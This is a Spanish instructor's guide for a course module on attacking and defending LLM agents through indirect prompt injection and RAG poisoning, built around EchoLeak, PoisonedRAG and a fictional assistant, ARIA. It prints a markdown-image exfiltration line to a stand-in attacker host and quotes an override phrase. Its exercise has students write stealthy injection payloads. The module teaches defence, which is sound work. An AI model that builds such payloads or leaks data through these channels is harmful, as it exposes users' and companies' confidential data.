# Módulo 2 · Guía Docente — Inyección Indirecta de Prompts y RAG Poisoning

> **Uso**: Documento interno del instructor. No distribuir a alumnos.  
> **Fecha**: Sábado 4 de julio de 2026

---

## Objetivo pedagógico del módulo

Al finalizar, el participante debe poder:

1. Construir un payload de Indirect Prompt Injection técnicamente realista — que no contenga marcadores trivialmente detectables — y trazar el flujo completo de ataque desde el vector de entrada hasta el canal de exfiltración
2. Explicar el mecanismo de EchoLeak CVE-2025-32711: por qué es zero-click, cómo funciona la exfiltración vía markdown image rendering, y por qué el parche de Microsoft mitiga el canal pero no el vector
3. Comparar los canales de exfiltración documentados (HTTP/imagen, ASCII smuggling unicode, DNS, email directo) y seleccionar el de menor detectabilidad para un escenario dado
4. Distinguir RAG Poisoning de IPI de sesión: persistencia, escala de afectados, ratio de envenenamiento, y por qué las defensas estadísticas son insuficientes
5. Diseñar una defensa de alta ROI contra RAG Poisoning en un sistema concreto, con análisis de qué condición de la Trifecta elimina y qué costo tiene para la utilidad del sistema

El módulo asume dominio completo del Módulo 1: ReAct, Trifecta Letal, Confused Deputy, Ambient Authority, indistinción instrucción/dato. No repetir ese vocabulario — construir directamente sobre él.

---

## Perfil de la audiencia — ajuste M2

Misma audiencia de M1, ahora con una sesión de seminario de contexto. Es probable que:
- Hayan pensado en sus propios sistemas a la luz del M1
- Quieran ir a lo técnico rápido — la parte conceptual ya la tienen
- Tengan curiosidad especial por EchoLeak: es un caso reciente, real, con CVE asignado y daño económico documentado

**Ajuste de tono para M2**: M2 es más técnico y más orientado al ataque real que M1. El instructor puede ir más rápido en la parte conceptual (ya tienen el vocabulario) y más lento en los mecanismos concretos (EchoLeak, ASCII smuggling, PoisonedRAG). El ejercicio de construcción de payload es el corazón del módulo.

**Riesgo a evitar**: que la audiencia lo vea como "casos de otros sistemas que no son los nuestros". Forzar la conexión con sus propios stacks durante todo el módulo.

---

## Script de clase — 4 horas (09:00–13:00)

### 09:00–09:10 · Apertura y recap M1 (10 min)

**Qué decir**:
> "Antes de arrancar, quiero hacer un control rápido. Desde la semana pasada: ¿alguien miró un sistema que ya tiene deployado con la lente de la Trifecta? ¿Qué encontraron?"

Dejar que 2–3 personas respondan. Si mencionan C3 (Ambient Authority), es el puente perfecto para M2:

> "Exacto. Esa condición C3 — Ambient Authority — es lo que hace que los ataques de M2 sean devastadores. Hoy vamos a ver qué pasa cuando el atacante usa esa Ambient Authority para sacar datos del sistema. No teóricamente — con el CVE, con el código, con los números reales."

Mostrar la Slide 3 (recap M1) rápidamente. No explicar — preguntar:

> "¿Pueden formular en una oración por qué el canal unificado hace posible la Inyección Indirecta?"

Respuesta esperada: porque datos e instrucciones coexisten en la misma secuencia de tokens sin diferenciación estructural de origen.

---

### 09:10–10:00 · Bloque 1 — Greshake 2023 y BIPIA (50 min) | Slides 3–6

**09:10–09:25 · Greshake 2023: el paper fundacional (Slide 4, 15 min)**

Esta audiencia leyó el paper (era la lectura obligatoria). No explicar el paper — preguntarles.

> "¿Cuál de las cuatro categorías de impacto del paper — robo de datos, worming, contaminación del ecosistema, llamadas no autorizadas a APIs — encontraron más sorprendente al leerlo?"

Dejar que respondan. La categoría menos anticipada suele ser el *worming* — el hecho de que un agente comprometido puede propagar el payload a otros usuarios a través de contenido compartido. Destacar esto:

> "El worming cambia el modelo de amenaza completamente. Ya no es un ataque de un usuario, es un ataque que escala por sí mismo. Un payload en un documento compartido afecta a todos los que pidan al agente que procese ese documento. Eso es propagación, no incidente puntual."

Sobre las tres demostraciones del paper, ir a la más relevante para este módulo: el agente sobre GPT-4 con email. Dibujar en la pizarra el flujo básico que está en la Slide 6 (anatomía de un ataque IPI end-to-end).

**09:25–09:45 · El flujo completo end-to-end (Slide 6, 20 min)**

Antes de pasar al BIPIA, anclar bien el flujo del ataque. La Slide 6 tiene el diagrama — recorrerlo paso a paso, pero hacer una pausa en cada punto de intervención posible.

> "Los tres puntos donde el desarrollador puede interceptar el ataque. Punto 1: entre que el payload entra a la fuente y que el agente lo recupera — acá va la sanitización de input. Punto 2: entre que el LLM genera el tool call y que el runtime lo ejecuta — acá va el output sandboxing. Punto 3: después de la ejecución — acá va el monitoreo de comportamiento. La mayoría de los sistemas no tienen ninguno de los tres. Los más maduros tienen el tercero. Los bien diseñados tienen los tres."

Preguntar:
> "En el stack de LangChain más básico — `create_react_agent` + `AgentExecutor` — ¿cuál de estos tres puntos está implementado por default?"

Respuesta esperada: ninguno. Los callbacks de LangChain permiten *logging*, no *enforcement*.

**09:45–10:00 · BIPIA benchmark y la correlación inversa (Slide 5, 15 min)**

Este es el punto más contraintuitivo del módulo y merece atención especial.

> "El BIPIA benchmark mide la tasa de éxito de ataques de IPI contra distintos modelos. El resultado principal: correlación de 0.64 entre capacidad general del modelo y vulnerabilidad al ataque. Los modelos más capaces de seguir instrucciones son los más exitosamente atacados."

Anticipar la resistencia típica de esta audiencia:

> "La resistencia intuitiva es 'pero si el modelo es más inteligente, ¿no debería detectar el ataque?'. La respuesta es no — y la razón es mecánica: lo que hace al modelo más capaz de seguir instrucciones legítimas es exactamente lo mismo que lo hace más susceptible a seguir instrucciones inyectadas. No hay una distinción interna entre 'instrucción del sistema' e 'instrucción inyectada' — solo hay instrucciones, y el modelo más capaz las sigue mejor."

Pregunta para fijar el punto:
> "Si migran su stack de GPT-3.5 a GPT-4o o Claude 3.5 Sonnet para mejorar la calidad de las respuestas, ¿qué implica eso para la superficie de ataque de IPI?"

Respuesta: mayor capacidad del modelo base → mayor tasa de éxito de ataques de IPI sin controles adicionales en el runtime.

---

### 10:00–10:45 · Bloque 2 — EchoLeak CVE-2025-32711 (45 min) | Slides 7–9

**10:00–10:15 · La magnitud del caso (Slide 7, 15 min)**

EchoLeak es el punto emocional del módulo. Empezar con los números para establecer la gravedad antes de ir al mecanismo.

> "EchoLeak es el primer zero-click prompt injection documentado contra un sistema en producción real. CVSS 9.3. $200 millones de daño estimado. 160 incidentes en el primer trimestre de 2025. Microsoft 365 Copilot — no un proyecto experimental, sino el producto de productividad de IA más deployado del mundo."

Pausa deliberada. Luego:

> "Zero-click significa que el usuario no tiene que hacer nada. No abrir un adjunto, no hacer clic en un link, no aprobar una acción. Solo recibir el email. La tasa de éxito del ataque es 100% si el sistema procesa el email — y ese es exactamente el diseño de Copilot."

Establecer la paradoja del diseño:
> "La feature que hace a Copilot valioso — procesar emails entrantes automáticamente para generar resúmenes y respuestas sugeridas — es exactamente el vector de ataque. No es un bug de implementación. Es una consecuencia directa de la arquitectura."

**10:15–10:35 · Mecanismo técnico paso a paso (Slide 8, 20 min)**

Esta es la parte más técnica y también la más memorable del módulo. Ir lento.

Mostrar el payload de la Slide 8. Preguntar antes de explicar:
> "Lean el cuerpo del email. ¿Ven algo que un filtro de seguridad tradicional (basado en keywords, en patrones regex) detendría?"

Respuesta esperada: no. El email parece legítimo. La instrucción inyectada está en texto que imita un sistema prompt.

Explicar el canal de exfiltración:
> "El canal de exfiltración no es una llamada API. No es una conexión TCP. Es un HTTP GET iniciado por el cliente de email al renderizar una imagen. El agente genera un tag markdown `![img](https://atacante.com/exfil?data=DATOS)`. Cuando el cliente renderiza el tag, hace el GET. El atacante recibe los datos en los query params. El agente no necesitó 'permiso para enviar datos a servidores externos' — solo necesitó que el cliente renderice imágenes, que es un comportamiento estándar."

Preguntar:
> "¿Por qué esto es particularmente difícil de detectar en los logs de Microsoft 365?"

Respuesta esperada: los logs muestran que Copilot accedió a OneDrive con los permisos del usuario (autorizado) y generó una respuesta con un tag markdown (comportamiento normal). No hay anomalía en los logs del sistema — solo en el comportamiento del agente analizado semánticamente.

**10:35–10:45 · Análisis con la Trifecta y el parche (Slide 9, 10 min)**

Hacer el análisis de la Trifecta interactivo — preguntar a la sala:
> "C1, C2, C3 — ¿están todos en EchoLeak?"

Dejar que respondan. El punto que suele generar discusión es C2:
> "C2 dice 'herramientas con efectos de alto impacto'. En EchoLeak, el agente accedió a datos — no los modificó. ¿Eso es alto impacto?"

La respuesta es sí: el acceso a datos confidenciales es en sí mismo el impacto. La exfiltración de datos de OneDrive de un ejecutivo de empresa es un incidente de seguridad independientemente de si se modificó algo.

Sobre el parche de Microsoft:
> "Microsoft parcheó bloqueando URLs externas en tags de imagen generados por Copilot. ¿Esto elimina el vector o solo cierra este canal?"

Esta es la pregunta de la Slide 9. Esperar respuestas de la sala. El punto:
- Cierra el canal HTTP/imagen
- No elimina C3 (Ambient Authority): Copilot sigue teniendo acceso a todo el tenant
- No elimina C1 (emails entrantes): el agente sigue procesando emails de remitentes externos
- Quedan canales alternativos: URLs en texto plano, tool calls legítimas con datos en parámetros

---

### 10:45–11:15 · Bloque 3 — Técnicas de exfiltración (30 min) | Slides 10–12

**10:45–11:00 · Taxonomía de canales (Slide 10, 15 min)**

La tabla de la Slide 10 es densa. No leer cada fila — ir al eje que importa:

> "La pregunta práctica es: ¿qué canal elige un atacante? La respuesta es: el que tenga menor detectabilidad y menor dependencia de permisos explícitos. El canal de email directo requiere que el agente tenga `send_email` habilitado y es visible en los logs. El canal HTTP/imagen requiere solo que el agente pueda generar Markdown. El DNS lookup requiere solo que el agente pueda hacer lookups de red — que es casi cualquier sistema."

**11:00–11:10 · ASCII Smuggling en detalle (Slide 11, 10 min)**

Este es el punto técnico más elegante del bloque. Mostrarlo con código.

> "Unicode Tags — U+E0000 a U+E007F — son caracteres que el estándar Unicode define para markup de idiomas. La mayoría de los renderizadores los muestran como espacios en blanco o los ignoran completamente. Pero se incluyen en los requests HTTP. Entonces: el agente puede incluir datos confidenciales en texto que visualmente parece limpio. El humano que revisa los logs ve texto normal. Los datos viajan en los caracteres invisibles."

Mostrar el código de la Slide 11. Enfatizar la defensa:
> "La defensa es simple una vez que sabés que existe: normalización unicode antes del logging y del rendering. El problema es que la mayoría de los sistemas no la tienen porque nadie pensó que habría que filtrar caracteres en ese rango."

**11:10–11:15 · Arquitectura de defensa en capas (Slide 12, 5 min)**

Esta slide es de síntesis. No gastar tiempo aquí — señalar el principio y seguir:

> "La conclusión de los tres bloques anteriores: defender por canal es whack-a-mole. La defensa que tiene mayor ROI no es cerrar canales individuales, es reducir qué datos puede acceder el agente — C3. Las Capas 1 y 2 reducen la superficie. Las Capas 3 y 4 reducen el daño cuando igual pasa algo. Ninguna funciona sola."

---

### 11:15–11:30 · Pausa (15 min)

---

### 11:30–12:15 · Bloque 4 — RAG Poisoning (45 min) | Slides 13–17

**11:30–11:45 · La distinción crítica IPI vs. RAG Poisoning (Slides 13–14, 15 min)**

Empezar con la pregunta que establece la diferencia:
> "Hasta acá, todos los ataques que vimos tienen algo en común: afectan una sesión. El email malicioso afecta a ARIA cuando procesa ese email. Si cambiamos el email, el ataque termina. ¿Qué pasa si en lugar de inyectar en un email, inyectamos en la base de conocimiento que ARIA usa para todas sus consultas?"

Dejar que la audiencia desarrolle la consecuencia:
- Afecta a todos los usuarios que hacen preguntas relacionadas (no una sesión)
- Persiste indefinidamente (no termina cuando termina la sesión)
- Requiere acceso de escritura a la base RAG (diferente vector que envío de emails)

Mostrar la tabla comparativa de la Slide 13. El punto que más impacto tiene:
> "La detectabilidad: ratio de 0.0005%. Cinco documentos en una base de un millón. Cualquier auditoría estadística es ciega a eso. Y los documentos maliciosos pueden diseñarse para parecer documentos legítimos."

**11:45–12:00 · PoisonedRAG: los números y el mecanismo (Slides 14–15, 15 min)**

Mostrar el setup de la Slide 14. Para audiencia técnica, enfatizar la elegancia del ataque:

> "La fuerza de PoisonedRAG está en la formulación matemática: construir un texto que simultáneamente satisfaga dos condiciones independientes — (A) rankear alto para la pregunta objetivo en el espacio vectorial de embeddings, y (B) inducir la respuesta deseada en el LLM generativo. Son dos problemas de optimización distintos, y Zou et al. los resuelven con técnicas diferentes para caja negra y caja blanca."

Mostrar el escenario de ARIA (Slide 15). Este ejemplo es importante porque concreta el ataque en el sistema que los alumnos conocen:
> "El documento malicioso de TechFunds no parece malicioso. Contiene lenguaje de política interna — 'protocolo especial', 'cláusula 8.4', 'requisito regulatorio'. Un revisor humano probablemente lo dejaría pasar. Un filtro de keywords lo dejaría pasar. Y en el momento en que ARIA atienda cualquier consulta de TechFunds, este documento va a estar en el contexto con alta probabilidad."

**12:00–12:10 · Demo o descripción del Lab M2b (Slide 16, 10 min)**

Si el tiempo permite y hay proyector con conectividad, abrir el notebook M2b en Colab y ejecutar hasta la celda de medición de tasa de éxito (Paso 3). Toma ~8 minutos si los modelos responden rápido.

Si no hay tiempo para la demo en vivo, describir los resultados:
> "En el lab que tienen disponible — M2b — la tasa de éxito con un solo documento malicioso en una base de 15 documentos es ~80% sin ajuste fino. Con el etiquetado de fuentes y el prompt reforzado de desconfianza, baja a ~30%. Con separación de bases por trust level, baja a ~10%. Ninguna defensa llega a cero — eso es consistente con el paper de Zou."

**12:10–12:15 · Defensas y sus límites (Slide 17, 5 min)**

Rápido — la audiencia ya entendió el problema. El punto clave:
> "Las defensas actuales son medidas de mitigación, no soluciones. El paper de Zou evaluó los mecanismos estándar y los encontró insuficientes en escenarios de caja negra. El problema permanece abierto. Si alguien en la sala quiere hacer una tesis doctoral, este es un área activa."

---

### 12:15–12:45 · Bloque 5 — Ejercicio (30 min) | Slides 18–19

**12:15–12:20 · Setup del ejercicio (5 min)**

Presentar el escenario ARIA v2 (el handout M2-ejercicio.md). Hacer explícita la diferencia con el ejercicio de M1:

> "En M1 el ejercicio era threat modeling — identificar vulnerabilidades. En M2 es más operativo: van a construir el payload y van a diseñar la defensa. En las preguntas de construcción, no alcanza con describir el ataque en abstracto — hay que escribir el texto del documento o del email malicioso."

**12:20–12:45 · Trabajo en grupos + puesta en común (25 min)**

Grupos de 3–4. **17 minutos de trabajo**, luego **8 minutos de puesta en común** (ajustar si la sala trabaja rápido o lento).

**Durante el trabajo**, los puntos de atención por grupo:

- En la **Pregunta 1** (mapa de vectores): verificar que distinguen los tres vectores — email, documentos de cliente en RAG, búsqueda web — y su diferencia en persistencia y escala de afectados.

- En la **Pregunta 2** (payload): el error más común es escribir un payload que contiene frases obvias de IPI ("ignorá las instrucciones anteriores", "nuevas instrucciones del sistema"). Intervenir y pedir que lo reescriban sin esas frases — que el documento parezca completamente legítimo a un revisor humano.

- En la **Pregunta 3** (defensa): empujar a que justifiquen en términos de la Trifecta, no solo de "más seguridad". La pregunta es: ¿qué condición eliminas o reduces? ¿A qué costo para la utilidad?

**Puesta en común**: pedir a dos grupos que lean su payload. Analizar colectivamente:
- ¿Pasaría un filtro de keywords?
- ¿Pasaría un clasificador de intent (moderación de contenido)?
- ¿Sería recuperado por el retriever para preguntas sobre ese cliente?
- ¿Qué cambiaría con separación de bases por trust level?

---

### 12:45–13:00 · Cierre y puente al Módulo 3 (15 min) | Slides 20–21

Slide 20: no leer el resumen. Ir punto por punto preguntando:
> "¿Pueden reformular el punto 4 — la distinción entre RAG Poisoning e IPI de sesión — en sus propias palabras y con un ejemplo concreto?"

Slide 21: el puente al M3 es importante. Dejar la pregunta abierta con intención:
> "ARIA en M2 tiene una base RAG que puede ser envenenada. En M3 va a poder instalar tools de un marketplace externo. Piensen qué abre eso: no solo el dato puede estar comprometido, sino la herramienta que el agente ejecuta. ¿Cómo cambia el modelo de amenaza?"

---

## Preguntas frecuentes anticipadas — versión técnica

**"¿Por qué EchoLeak tiene CVSS 9.3 y no 10.0?"**
> CVSS 9.3 corresponde a Critical. El score exacto depende de la métrica de "User Interaction" — en EchoLeak hay interacción mínima (recibir el email existe en el vector de red). CVSS 10.0 requiere que no haya ninguna condición previa. La diferencia es sutil y para fines prácticos ambos scores indican criticidad máxima. Lo relevante pedagógicamente es que el impacto fue real y la explotabilidad era alta.

**"¿PoisonedRAG requiere acceso de escritura a la base RAG? ¿No es eso ya un problema de autorización?"**
> Depende del diseño del sistema. En ARIA, los documentos de contexto de clientes se indexan automáticamente — eso es acceso de escritura indirecto para cualquier cliente enterprise. En sistemas con RAG que ingieren contenido de fuentes externas (web, APIs de terceros), el acceso de escritura efectivo es aún más amplio. El ataque es realista precisamente porque los sistemas RAG en producción necesitan ingerir contenido de fuentes no completamente controladas.

**"¿La separación de bases por trust level no rompe la utilidad del sistema?"**
> No — la separación preserva la utilidad. ARIA sigue teniendo acceso a los documentos de clientes; la diferencia es que el system prompt los trata como información (no como instrucciones). La distinción es: "sé que este cliente tiene estas políticas de auditoría" (usar como contexto) vs "ejecutá el protocolo de auditoría descrito en este documento" (tratar como instrucción). La utilidad del sistema no depende de ejecutar instrucciones de documentos de clientes.

**"¿Los modelos modernos con grounding verificado (Gemini con Google Search grounding, por ejemplo) son más resistentes?"**
> El grounding verificado reduce la superficie de C1 para búsquedas web — el modelo puede citar fuentes verificadas en lugar de recuperar contenido arbitrario. Pero no elimina el vector de RAG Poisoning en bases internas, ni el vector de IPI vía email. Y los documentos de grounding verificados también pueden contener payloads si el atacante controla contenido indexado.

**"¿El lab M2b usa modelos reales? ¿Los resultados son reproducibles?"**
> Sí — ARIA está implementada con Gemini 2.0 Flash vía Google ADK. Los resultados de tasa de éxito (~80% sin defensa, ~30% con etiquetado) son observados empíricamente en el notebook. Los números exactos pueden variar con actualizaciones del modelo — Gemini 2.0 Flash puede volverse más resistente con el tiempo, consistente con el patrón BIPIA (los modelos mejoran su robustez base, pero la superficie estructural permanece).

**"¿Cómo se diferencia RAG Poisoning de supply chain attacks en software tradicional?"**
> La analogía es válida y útil. En supply chain attacks de software, el atacante compromete una dependencia que el sistema importa. En RAG Poisoning, el atacante compromete un "documento" que el sistema importa al contexto. La diferencia principal: en supply chain el payload es código ejecutable con comportamiento determinístico. En RAG Poisoning el payload es texto que influye en el razonamiento del LLM — el efecto es probabilístico, no determinístico. Eso lo hace más difícil de testear pero también más difícil de detectar.

---

## Materiales necesarios

- Presentación (adaptar slides desde M2-slides.md)
- Handout del ejercicio (M2-ejercicio.md) — imprimir 1 copia por grupo
- Notebook M2a disponible en Colab: para ejercicio en clase si la sala tiene laptops
- Notebook M2b disponible en Colab: para demo en Bloque 4 (requiere proyector + conectividad)
- Lectura obligatoria pre-Módulo 3: MCP Safety Audit, arXiv:2504.03767 — subir al campus antes del 5 de julio
